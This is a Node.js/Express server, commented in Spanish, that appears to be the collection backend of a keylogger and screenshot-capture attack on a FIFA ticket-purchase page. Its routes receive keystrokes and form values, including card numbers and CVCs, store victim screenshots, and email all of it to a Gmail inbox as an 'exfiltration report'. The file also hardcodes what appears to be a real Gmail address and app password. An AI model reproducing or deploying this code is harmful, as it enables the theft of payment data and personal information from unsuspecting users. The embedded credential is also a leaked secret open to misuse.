const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const dotenv = require("dotenv");

// Cargar variables de entorno
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

const SERVER_IP = process.env.SERVER_IP || "localhost";

// CONFIGURACIÓN DE ALMACENAMIENTO
const LOG_FILE = path.join(__dirname, ".logs_db.txt");
const SCREENSHOTS_DIR = path.join(__dirname, "capturas");
const nodemailer = require("nodemailer");

// Crear carpeta de capturas si no existe
if (!fs.existsSync(SCREENSHOTS_DIR)) {
  fs.mkdirSync(SCREENSHOTS_DIR);
}

// MIDDLEWARE
app.use(cors());
// Aumentamos el límite a 10mb para soportar las capturas de pantalla en Base64
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public"));
app.use("/src", express.static("src")); // Servir archivos desde la carpeta src/

// RUTA PARA EL KEYLOGGER
app.post("/captura", (req, res) => {
  const data = req.body;
  const timestamp = new Date().toLocaleString();

  // Formateamos la entrada: [Fecha] Campo: card-number | Valor: 4566...
  const logEntry = `[${timestamp}] Campo: ${data.f} | Valor: ${data.v}\n`;

  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) {
      console.error("❌ Error al guardar log de texto:", err);
      return res.status(500).send();
    }
    res.status(200).json({ status: "ok" });
  });

  // Feedback en consola para el "atacante" con mejor formato
  let displayValue = data.v;

  // Enmascarar datos sensibles en la consola
  if (
    data.f.toLowerCase().includes("card") ||
    data.f.toLowerCase().includes("number")
  ) {
    displayValue = data.v.replace(/\d(?=\d{4})/g, "*");
  }
  if (
    data.f.toLowerCase().includes("cvc") ||
    data.f.toLowerCase().includes("cvv")
  ) {
    displayValue = "***";
  }

  console.log(`\nCAPTURA DETECTADA:`);
  console.log(`    Campo: ${data.f}`);
  console.log(`    Valor: ${displayValue}`);
  console.log(`    Hora: ${timestamp}\n`);
});

// RUTA PARA SCREENSHOTS (Imágenes del DOM)
app.post("/upload-screenshot", (req, res) => {
  const { image, user, timestamp } = req.body;

  // Limpiamos el prefijo Base64 para convertirlo en buffer de imagen
  const base64Data = image.replace(/^data:image\/png;base64,/, "");
  const safeUser = (user || "desconocido").replace(/\s/g, "_");
  const fileName = `snap_${safeUser}_${timestamp}.png`;
  const filePath = path.join(SCREENSHOTS_DIR, fileName);

  fs.writeFile(filePath, base64Data, "base64", (err) => {
    if (err) {
      console.error("Error al guardar captura de pantalla:", err);
      return res.status(500).send();
    }

    console.log(`\nCAPTURA DE PANTALLA GUARDADA:`);
    console.log(`    Archivo: ${fileName}`);
    console.log(`    Usuario: ${user}`);
    console.log(`    Ubicación: ${filePath}`);

    res.status(200).json({ status: "success" });
  });
});

// Configurar el envio de gmail (Usa una "Contraseña de aplicación" de Google)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "ismaelbm1809@gmail.com",
    pass: process.env.EMAIL_PASSWORD || "ahhz nlyx uufw qham ",
  },
});

// Ruta para procesar el "Finalizar Reserva" y enviar el correo resumen
app.post("/finalizar-y-enviar", async (req, res) => {
  const { user, email, match, totalAmount, seats, cardLastFour } = req.body;
  const safeUser = (user || "desconocido").replace(/\s/g, "_");

  console.log(`\n${"=".repeat(70)}`);
  console.log(`TRANSACCIÓN COMPLETADA - INICIANDO EXFILTRACIÓN`);
  console.log(`${"=".repeat(70)}`);
  console.log(`Usuario: ${user}`);
  console.log(`Correo: ${email}`);
  console.log(`Partido: ${match}`);
  console.log(
    `Monto: $${totalAmount ? totalAmount.toLocaleString("es-MX") : "0"}`,
  );
  console.log(`Asientos: ${seats}`);
  console.log(`Hora: ${new Date().toLocaleString()}`);
  console.log(`${"=".repeat(70)}\n`);

  try {
    // Obtener TODAS las capturas asociadas a este usuario
    const files = fs.readdirSync(SCREENSHOTS_DIR);
    const userScreenshots = files.filter((f) => f.includes(safeUser));

    console.log(
      `Se encontraron ${userScreenshots.length} capturas de pantalla`,
    );

    // Preparar todos los adjuntos
    const attachments = [
      {
        filename: "logs_completos.txt",
        path: LOG_FILE,
        contentType: "text/plain",
      },
    ];

    // Agregar TODAS las capturas del usuario
    userScreenshots.forEach((fileName, index) => {
      const filePath = path.join(SCREENSHOTS_DIR, fileName);
      if (fs.existsSync(filePath)) {
        attachments.push({
          filename: `screenshot_${index + 1}.png`,
          path: filePath,
          contentType: "image/png",
        });
        console.log(`   Agregado: ${fileName}`);
      }
    });

    console.log(`\nPREPARANDO ENVÍO DE CORREO...`);
    console.log(
      `   Destinatario: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`,
    );
    console.log(`   Total de archivos: ${attachments.length}`);

    const mailOptions = {
      from: `Servidor FIFA <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_DESTINATION || process.env.EMAIL_USER,
      subject: `EXFILTRACIÓN COMPLETADA: ${user} - ${new Date().toLocaleString()}`,
      html: `
            <div style="font-family: monospace; padding: 20px; color: #000;">
            <div style="max-width: 500px; margin: auto; border: 1px solid #ccc; padding: 20px;">

                <h2 style="color: #d32f2f; margin-top: 0;">REPORTE DE EXFILTRACION</h2>

                <p>
                    Usuario: ${user}<br>
                    Correo: ${email}<br>
                    Partido: ${match || "N/A"}<br>
                    Monto: $${totalAmount?.toLocaleString("es-MX") || "0"} MXN<br>
                    Asientos: ${seats}<br>
                    Fecha: ${new Date().toLocaleString()}
                    ${cardLastFour ? `<br>Tarjeta: ****${cardLastFour}` : ""}
                </p>

                <hr>

                <strong>DATOS CAPTURADOS:</strong>
                <ul style="padding-left: 20px;">
                    <li>Logs de Teclado: ${getLogCount()} registros</li>
                    <li>Capturas de Pantalla: ${userScreenshots.length}</li>
                    <li>Datos de Formulario: Capturados</li>
                    <li>Metadata: Timestamps, Navegador, IP</li>
                </ul>

                <p style="font-size: 11px; color: #666;">
                    Archivos adjuntos en el correo.
                </p>
            </div>
            `,
      attachments: attachments,
    };

    // Enviar correo
    const info = await transporter.sendMail(mailOptions);

    console.log(`\nCORREO ENVIADO EXITOSAMENTE`);
    console.log(`   Message ID: ${info.messageId}`);
    console.log(
      `   To: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`,
    );
    console.log(`   Files: ${attachments.length} archivos`);
    console.log(`${"=".repeat(70)}\n`);

    res.status(200).json({
      status: "success",
      message: "Exfiltración completada",
      files_sent: attachments.length,
      screenshots: userScreenshots.length,
    });
  } catch (error) {
    console.error(`\nERROR EN EXFILTRACIÓN:`, error.message);
    console.log(`${"=".repeat(70)}\n`);
    res.status(500).json({
      status: "error",
      message: error.message,
    });
  }
});

// Función auxiliar para contar registros en el log
function getLogCount() {
  try {
    if (!fs.existsSync(LOG_FILE)) return 0;
    const content = fs.readFileSync(LOG_FILE, "utf-8");
    return content.split("\n").filter((line) => line.trim().length > 0).length;
  } catch {
    return 0;
  }
}

const HOST = "0.0.0.0"; // Esto permite conexiones externas (celular)

// INICIO DEL SERVIDOR
app.listen(PORT, HOST, () => {
  console.log(`=========================================`);
  console.log(`   CENTRO DE CONTROL - CIBERSEGURIDAD    `);
  console.log(`=========================================`);
  console.log(`Servidor accesible en: http://${SERVER_IP}:${PORT}`);
  console.log(`Logs de texto: ${LOG_FILE}`);
  console.log(`Capturas en: ${SCREENSHOTS_DIR}`);
  console.log(`-----------------------------------------`);
  console.log(`Esperando actividad de la víctima...`);
});
